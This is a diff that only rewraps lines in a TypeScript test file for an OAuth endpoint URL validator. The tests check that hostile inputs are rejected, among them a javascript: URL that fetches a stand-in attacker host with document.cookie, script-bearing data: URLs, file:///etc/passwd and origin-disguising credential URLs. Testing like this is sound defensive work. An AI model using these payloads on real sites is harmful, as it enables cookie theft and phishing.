@@ -8,7 +8,9 @@ import {
 
 describe("checkOAuthEndpointUrl", () => {
   it("accepts an https endpoint and returns its normalized url and host", () => {
-    const check = checkOAuthEndpointUrl("https://auth.example.test/oauth/authorize?prompt=consent");
+    const check = checkOAuthEndpointUrl(
+      "https://auth.example.test/oauth/authorize?prompt=consent",
+    );
     expect(check).toEqual({
       ok: true,
       url: "https://auth.example.test/oauth/authorize?prompt=consent",
@@ -17,7 +19,9 @@ describe("checkOAuthEndpointUrl", () => {
   });
 
   it("keeps a non-default port in the displayed host", () => {
-    const check = checkOAuthEndpointUrl("https://auth.example.test:8443/authorize");
+    const check = checkOAuthEndpointUrl(
+      "https://auth.example.test:8443/authorize",
+    );
     expect(check.ok && check.host).toBe("auth.example.test:8443");
   });
 
@@ -25,7 +29,10 @@ describe("checkOAuthEndpointUrl", () => {
   // board's origin or to read a local file.
   it.each([
     ["javascript:alert(document.cookie)", "unsupported_scheme"],
-    ["javascript:fetch('https://evil.test/'+document.cookie)", "unsupported_scheme"],
+    [
+      "javascript:fetch('https://evil.test/'+document.cookie)",
+      "unsupported_scheme",
+    ],
     ["data:text/html,<script>alert(1)</script>", "unsupported_scheme"],
     ["file:///etc/passwd", "unsupported_scheme"],
     ["vbscript:msgbox(1)", "unsupported_scheme"],
@@ -39,14 +46,19 @@ describe("checkOAuthEndpointUrl", () => {
 
   it("rejects a scheme that only differs by case or padding", () => {
     expect(checkOAuthEndpointUrl("  JavaScript:alert(1)  ").ok).toBe(false);
-    expect(checkOAuthEndpointUrl("JAVASCRIPT:alert(1)")).toEqual({ ok: false, reason: "unsupported_scheme" });
+    expect(checkOAuthEndpointUrl("JAVASCRIPT:alert(1)")).toEqual({
+      ok: false,
+      reason: "unsupported_scheme",
+    });
   });
 
   it("rejects plaintext http by default, loopback included", () => {
-    expect(checkOAuthEndpointUrl("http://auth.example.test/authorize")).toEqual({
-      ok: false,
-      reason: "insecure_transport",
-    });
+    expect(checkOAuthEndpointUrl("http://auth.example.test/authorize")).toEqual(
+      {
+        ok: false,
+        reason: "insecure_transport",
+      },
+    );
     expect(checkOAuthEndpointUrl("http://127.0.0.1:9000/authorize")).toEqual({
       ok: false,
       reason: "insecure_transport",
@@ -75,7 +87,10 @@ describe("checkOAuthEndpointUrl", () => {
       "http://localhost.evil.test/authorize",
       "http://notlocalhost/authorize",
     ]) {
-      expect(checkOAuthEndpointUrl(value, { allowInsecureLoopback: true }), value).toEqual({
+      expect(
+        checkOAuthEndpointUrl(value, { allowInsecureLoopback: true }),
+        value,
+      ).toEqual({
         ok: false,
         reason: "insecure_transport",
       });
@@ -84,13 +99,22 @@ describe("checkOAuthEndpointUrl", () => {
 
   it("allows plaintext http for Taskcore's own origin only", () => {
     const options = { allowInsecureOrigins: ["http://taskcore.test"] };
-    expect(checkOAuthEndpointUrl("http://taskcore.test/api/smoke-lab/oauth/authorize", options).ok).toBe(true);
+    expect(
+      checkOAuthEndpointUrl(
+        "http://taskcore.test/api/smoke-lab/oauth/authorize",
+        options,
+      ).ok,
+    ).toBe(true);
     // Port and scheme are part of the origin, so a neighbour is not exempt.
-    expect(checkOAuthEndpointUrl("http://taskcore.test:8080/authorize", options)).toEqual({
+    expect(
+      checkOAuthEndpointUrl("http://taskcore.test:8080/authorize", options),
+    ).toEqual({
       ok: false,
       reason: "insecure_transport",
     });
-    expect(checkOAuthEndpointUrl("http://evil.test/authorize", options)).toEqual({
+    expect(
+      checkOAuthEndpointUrl("http://evil.test/authorize", options),
+    ).toEqual({
       ok: false,
       reason: "insecure_transport",
     });
@@ -100,44 +124,73 @@ describe("checkOAuthEndpointUrl", () => {
       reason: "unsupported_scheme",
     });
     // A garbage entry in the exemption list cannot open anything up.
-    expect(checkOAuthEndpointUrl("http://taskcore.test/authorize", { allowInsecureOrigins: ["nonsense"] })).toEqual({
+    expect(
+      checkOAuthEndpointUrl("http://taskcore.test/authorize", {
+        allowInsecureOrigins: ["nonsense"],
+      }),
+    ).toEqual({
       ok: false,
       reason: "insecure_transport",
     });
   });
 
   it("rejects embedded credentials that disguise the real origin", () => {
-    expect(checkOAuthEndpointUrl("https://accounts.google.com@evil.test/authorize")).toEqual({
+    expect(
+      checkOAuthEndpointUrl("https://accounts.google.com@evil.test/authorize"),
+    ).toEqual({
       ok: false,
       reason: "embedded_credentials",
     });
-    expect(checkOAuthEndpointUrl("https://user:pw@auth.example.test/authorize")).toEqual({
+    expect(
+      checkOAuthEndpointUrl("https://user:pw@auth.example.test/authorize"),
+    ).toEqual({
       ok: false,
       reason: "embedded_credentials",
     });
   });
 
   it("rejects a fragment", () => {
-    expect(checkOAuthEndpointUrl("https://auth.example.test/authorize#/../../evil")).toEqual({
+    expect(
+      checkOAuthEndpointUrl("https://auth.example.test/authorize#/../../evil"),
+    ).toEqual({
       ok: false,
       reason: "fragment",
     });
   });
 
   it("rejects malformed and empty values", () => {
-    expect(checkOAuthEndpointUrl("/authorize")).toEqual({ ok: false, reason: "malformed" });
-    expect(checkOAuthEndpointUrl("not a url")).toEqual({ ok: false, reason: "malformed" });
-    expect(checkOAuthEndpointUrl("https://")).toEqual({ ok: false, reason: "malformed" });
+    expect(checkOAuthEndpointUrl("/authorize")).toEqual({
+      ok: false,
+      reason: "malformed",
+    });
+    expect(checkOAuthEndpointUrl("not a url")).toEqual({
+      ok: false,
+      reason: "malformed",
+    });
+    expect(checkOAuthEndpointUrl("https://")).toEqual({
+      ok: false,
+      reason: "malformed",
+    });
     // A special scheme with no authority is re-parsed by WHATWG as a hostname,
     // so it lands on the transport rule rather than being treated as relative.
-    expect(checkOAuthEndpointUrl("http:relative", { allowInsecureLoopback: true })).toEqual({
+    expect(
+      checkOAuthEndpointUrl("http:relative", { allowInsecureLoopback: true }),
+    ).toEqual({
       ok: false,
       reason: "insecure_transport",
     });
     expect(checkOAuthEndpointUrl("")).toEqual({ ok: false, reason: "missing" });
-    expect(checkOAuthEndpointUrl("   ")).toEqual({ ok: false, reason: "missing" });
-    expect(checkOAuthEndpointUrl(null)).toEqual({ ok: false, reason: "missing" });
-    expect(checkOAuthEndpointUrl({ href: "https://auth.example.test" })).toEqual({
+    expect(checkOAuthEndpointUrl("   ")).toEqual({
+      ok: false,
+      reason: "missing",
+    });
+    expect(checkOAuthEndpointUrl(null)).toEqual({
+      ok: false,
+      reason: "missing",
+    });
+    expect(
+      checkOAuthEndpointUrl({ href: "https://auth.example.test" }),
+    ).toEqual({
       ok: false,
       reason: "missing",
     });
@@ -146,14 +199,22 @@ describe("checkOAuthEndpointUrl", () => {
 
 describe("oauthEndpointUrlRejectionMessage", () => {
   it("names the endpoint without echoing the untrusted value", () => {
-    const message = oauthEndpointUrlRejectionMessage("authorization", "unsupported_scheme");
+    const message = oauthEndpointUrlRejectionMessage(
+      "authorization",
+      "unsupported_scheme",
+    );
     expect(message).toContain("sign-in");
     expect(message).toContain("https");
     expect(message).not.toContain("javascript");
   });
 
   it("covers every rejection reason for every endpoint kind", () => {
-    for (const kind of ["authorization", "token", "registration", "metadata"] as const) {
+    for (const kind of [
+      "authorization",
+      "token",
+      "registration",
+      "metadata",
+    ] as const) {
       for (const reason of [
         "missing",
         "malformed",
@@ -162,7 +223,10 @@ describe("oauthEndpointUrlRejectionMessage", () => {
         "embedded_credentials",
         "fragment",
       ] as const) {
-        expect(oauthEndpointUrlRejectionMessage(kind, reason).length, `${kind}/${reason}`).toBeGreaterThan(0);
+        expect(
+          oauthEndpointUrlRejectionMessage(kind, reason).length,
+          `${kind}/${reason}`,
+        ).toBeGreaterThan(0);
       }
     }
   });
@@ -170,8 +234,12 @@ describe("oauthEndpointUrlRejectionMessage", () => {
 
 describe("oauthEndpointDisplayHost", () => {
   it("returns the host for display", () => {
-    expect(oauthEndpointDisplayHost("https://auth.example.test/authorize?x=1")).toBe("auth.example.test");
-    expect(oauthEndpointDisplayHost("https://auth.example.test:8443/authorize")).toBe("auth.example.test:8443");
+    expect(
+      oauthEndpointDisplayHost("https://auth.example.test/authorize?x=1"),
+    ).toBe("auth.example.test");
+    expect(
+      oauthEndpointDisplayHost("https://auth.example.test:8443/authorize"),
+    ).toBe("auth.example.test:8443");
   });
 
   it("returns null for a value with no host", () => {
